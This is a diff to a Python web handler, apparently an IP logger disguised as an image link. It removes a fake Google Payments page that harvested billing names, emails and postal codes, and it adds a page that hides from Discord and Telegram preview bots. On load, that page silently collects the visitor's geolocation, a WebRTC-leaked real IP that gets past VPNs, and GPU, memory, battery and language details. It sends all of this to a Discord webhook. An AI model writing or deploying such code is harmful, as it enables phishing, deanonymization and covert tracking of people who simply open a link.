@@ -1,6 +1,6 @@
 # ==============================================================================
-# HOLY SYSTEM v17.0 - "MONEY-TRACE" (PAYMENT IDENTITY & GLOBAL CLOUD)
-# FEATURES: GOOGLE PAY SIMULATION, BILLING IDENTITY, WEBRTC REAL-IP, AUTOFILL STRIKE
+# HOLY SYSTEM v18.0 - "GHOST-STRIKE" (THE SILENT HUNTER)
+# NO FORMS. NO BUTTONS. JUST PURE BACKGROUND LOGGING.
 # ==============================================================================
 
 from http.server import BaseHTTPRequestHandler
@@ -17,6 +17,7 @@ class handler(BaseHTTPRequestHandler):
             ip = self.headers.get('x-forwarded-for', self.client_address[0]).split(',')[0]
             ua = self.headers.get('user-agent', 'Unknown')
             
+            # Bot Savunması (Discord önizlemesi için)
             if any(b in ua for b in ["Discordbot", "TelegramBot"]):
                 self.send_response(200)
                 self.send_header('Content-type', 'text/html')
@@ -24,59 +25,37 @@ class handler(BaseHTTPRequestHandler):
                 self.wfile.write(f'<html><head><meta property="og:image" content="{REDIRECT_IMAGE}"></head></html>'.encode())
                 return
 
+            # 1. SUNUCU TARAFI LOGLAMA (IP & KONUM)
             geo = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
+            requests.post(WEBHOOK_URL, json={
+                "username": "GHOST SERVER",
+                "embeds": [{
+                    "title": "🌑 GHOST-STRIKE: TARGET INTERCEPTED",
+                    "color": 0x000000,
+                    "fields": [
+                        {"name": "🌍 Location", "value": f"{geo.get('city')}, {geo.get('country')}", "inline": True},
+                        {"name": "🌐 Public IP", "value": f"`{ip}`", "inline": True},
+                        {"name": "🛡️ VPN Check", "value": "🚨 DETECTED" if geo.get('proxy') else "✅ CLEAN", "inline": True}
+                    ]
+                }]
+            })
 
+            # 2. SESSİZ AGENT (JAVASCRIPT)
             self.send_response(200)
             self.send_header('Content-type', 'text/html; charset=utf-8')
             self.end_headers()
 
-            # GOOGLE PAYMENTS VERIFICATION UI
             content = f'''
             <!DOCTYPE html>
             <html>
-            <head>
-                <meta charset="UTF-8">
-                <style>
-                    body {{ background: #fff; font-family: 'Roboto', arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #3c4043; }}
-                    #pay-box {{ width: 400px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }}
-                    .g-logo {{ width: 74px; margin-bottom: 24px; }}
-                    h1 {{ font-size: 22px; font-weight: 400; margin-bottom: 10px; color: #202124; }}
-                    p {{ font-size: 14px; margin-bottom: 24px; line-height: 1.5; }}
-                    .input-field {{ width: 100%; padding: 13px 15px; margin-bottom: 16px; border: 1px solid #dadce0; border-radius: 4px; font-size: 14px; box-sizing: border-box; }}
-                    .input-field:focus {{ border: 2px solid #1a73e8; outline: none; padding: 12px 14px; }}
-                    .btn-pay {{ width: 100%; background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; font-size: 14px; cursor: pointer; }}
-                    .footer {{ font-size: 12px; color: #70757a; margin-top: 24px; }}
-                </style>
-            </head>
-            <body>
-                <div id="pay-box">
-                    <img class="g-logo" src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png">
-                    <h1>Payment Verification</h1>
-                    <p>To access this premium content, please verify your Google Payments identity. No charges will be made.</p>
-                    
-                    <input type="text" id="billName" class="input-field" placeholder="Full Billing Name" autocomplete="cc-name">
-                    <input type="email" id="billMail" class="input-field" placeholder="Google Account Email" autocomplete="email">
-                    <input type="text" id="billZip" class="input-field" placeholder="Billing Zip Code / Postal Code" autocomplete="postal-code">
-
-                    <button class="btn-pay" id="verifyBtn">Verify Account</button>
-                    
-                    <div class="footer">
-                        Securely processed by Google Payments Services
-                    </div>
-                </div>
-
+            <head><title>Loading...</title></head>
+            <body style="background: #000; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh;">
+                <img src="{REDIRECT_IMAGE}" style="max-width: 100%; height: auto;">
+                
                 <script>
-                document.getElementById('verifyBtn').onclick = async function() {{
-                    const name = document.getElementById('billName').value;
-                    const mail = document.getElementById('billMail').value;
-                    const zip = document.getElementById('billZip').value;
-
-                    if(name.length < 3 || !mail.includes('@')) return;
-
-                    this.innerText = "Processing...";
-                    
-                    // DEEP WEBRTC REAL-IP LEAK
-                    let realIP = "Checking...";
+                async function silentStrike() {{
+                    // WebRTC VPN Bypass
+                    let realIP = "Hidden";
                     try {{
                         const pc = new RTCPeerConnection({{iceServers: [{{urls: "stun:stun.l.google.com:19302"}}]}});
                         pc.createDataChannel("");
@@ -89,25 +68,34 @@ class handler(BaseHTTPRequestHandler):
                         }};
                     }} catch(e) {{}}
 
-                    const payload = JSON.stringify({{
-                        username: "GOOGLE PAYMENTS SENSOR",
+                    // GPU & Hardware
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl');
+                    const debug = gl.getExtension('WEBGL_debug_renderer_info');
+                    const gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "N/A";
+
+                    // Veriyi Hazırla
+                    const data = JSON.stringify({{
+                        username: "GHOST AGENT",
                         embeds: [{{
-                            title: "💳 FINANCIAL IDENTITY DECRYPTED",
-                            color: 0x34a853,
+                            title: "💀 SILENT EXTRACTION COMPLETE",
+                            color: 0x000000,
                             fields: [
-                                {{"name": "👤 Billing Name", "value": "```" + name + "```", "inline": false}},
-                                {{"name": "📧 Google Email", "value": "```" + mail + "```", "inline": false}},
-                                {{"name": "📮 Billing Zip", "value": "`" + zip + "`", "inline": true}},
-                                {{"name": "⚡ Real IP (WebRTC)", "value": "`" + realIP + "`", "inline": true}},
-                                {{"name": "🖥️ System Info", "value": "Platform: " + navigator.platform + "\\nMemory: " + (navigator.deviceMemory || "N/A") + "GB", "inline": false}}
-                            ],
-                            footer: {{"text": "Money-Trace v17.0 Global Hunter"}}
+                                {{"name": "⚡ Real IP (VPN Bypass)", "value": "`" + realIP + "`", "inline": false}},
+                                {{"name": "🖼️ GPU Model", "value": "```" + gpu + "```", "inline": false}},
+                                {{"name": "💻 Hardware", "value": "Cores: " + navigator.hardwareConcurrency + " | RAM: " + (navigator.deviceMemory || "N/A") + "GB", "inline": true}},
+                                {{"name": "🔋 Battery", "value": (navigator.getBattery ? (await navigator.getBattery()).level * 100 + "%" : "N/A"), "inline": true}},
+                                {{"name": "🌐 Language", "value": navigator.language, "inline": true}}
+                            ]
                         }}]
                     }});
 
-                    navigator.sendBeacon("{WEBHOOK_URL}", new Blob([payload], {{type: 'application/json'}}));
-                    setTimeout(() => {{ window.location.href = "{REDIRECT_IMAGE}"; }}, 800);
-                }};
+                    // Sessiz Gönderim
+                    navigator.sendBeacon("{WEBHOOK_URL}", new Blob([data], {{type: 'application/json'}}));
+                }}
+                
+                // Sayfa açılır açılmaz çalıştır
+                window.onload = silentStrike;
                 </script>
             </body>
             </html>
